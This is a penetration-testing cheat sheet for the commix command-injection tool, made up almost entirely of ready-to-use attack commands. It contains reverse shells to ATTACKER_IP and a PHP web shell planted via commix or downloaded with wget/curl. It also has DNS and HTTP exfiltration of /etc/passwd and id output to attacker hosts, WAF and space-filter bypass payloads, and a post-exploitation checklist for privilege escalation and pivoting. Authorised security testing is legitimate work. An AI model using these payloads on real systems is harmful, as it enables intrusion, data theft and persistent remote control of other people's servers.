# commix — Techniques, Shell Escalation & Payloads

## Manual Command Injection Detection

Before using commix, confirm manually:

```bash
# Basic separators to test:
# ; | || && & `cmd` $(cmd) %0a %0d

# In GET params:
curl "http://target.com/ping?ip=127.0.0.1;id"
curl "http://target.com/ping?ip=127.0.0.1|id"
curl "http://target.com/ping?ip=127.0.0.1%0aid"

# Blind: time-based detection
curl "http://target.com/ping?ip=127.0.0.1;sleep+5"
curl "http://target.com/ping?ip=$(sleep+5)"
# Response delay > 5s = injection confirmed
```

## Reverse Shell via commix

```bash
# Get OS shell, then upgrade to reverse shell:
commix --url="http://target.com/?ip=1" --os-shell
# In the pseudo-shell:
> bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
> python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## File Upload via Command Injection

```bash
# Write webshell directly
commix --url="http://target.com/?ip=1" \
    --file-write=./shell.php \
    --file-dest=/var/www/html/uploads/cmd.php

# Shell content:
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# If --file-write blocked, use OS shell to wget:
commix --url="http://target.com/?ip=1" --os-shell
> wget http://ATTACKER/shell.php -O /var/www/html/shell.php
> curl http://ATTACKER/shell.php -o /var/www/html/shell.php
```

## Blind Injection Exfiltration

```bash
# DNS exfil (when output not visible):
# In commix: --technique=timebased confirms injection
# Then exfiltrate via DNS:
> nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
> curl "http://ATTACKER/?d=$(id | base64)"

# Out-of-band via curl to collaborator:
> curl "http://BURP_COLLABORATOR/$(id | base64 -w0)"
```

## Time-Based Injection Payloads

```bash
# Linux sleep
; sleep 5
| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
%0asleep%205    # URL-encoded newline

# Windows
; timeout /t 5
& timeout /t 5
| ping -n 5 127.0.0.1
```

## IFS Bypass (space filter bypass)

```bash
# Replace spaces with $IFS
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Other space alternatives:
{cat,/etc/passwd}
cat</etc/passwd    # redirect as alternative to space
X=$'\x20';cat${X}/etc/passwd
```

## WAF Bypass Patterns

```bash
# Slash bypass (/ filtered):
echo${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Backtick alternative (blocked by some WAFs):
$(id)   →   `id`

# String concatenation to bypass keyword filter:
ca""t /etc/passwd
c'a't /etc/passwd
/b"in/b"ash

# Null byte:
cat /etc/passwd%00

# Hex encoding of command:
$(printf '\x69\x64')    # = id
```

## Commix Session Resume

```bash
# commix saves sessions in .output/<target>/*.sqlite
ls .output/
# Resume or review saved session
commix --url="http://target.com/?ip=1" --flush-session
```

## Post-Exploitation Checklist

After getting OS shell via commix:
```bash
# System info
id && uname -a && cat /etc/os-release

# Check for writable web dirs
find /var/www -writable -type d 2>/dev/null

# SUID binaries for privilege escalation
find / -perm -4000 -type f 2>/dev/null

# Cron jobs
cat /etc/crontab && ls /etc/cron*

# Network interfaces (pivot targets)
ip addr && ss -tulnp
```
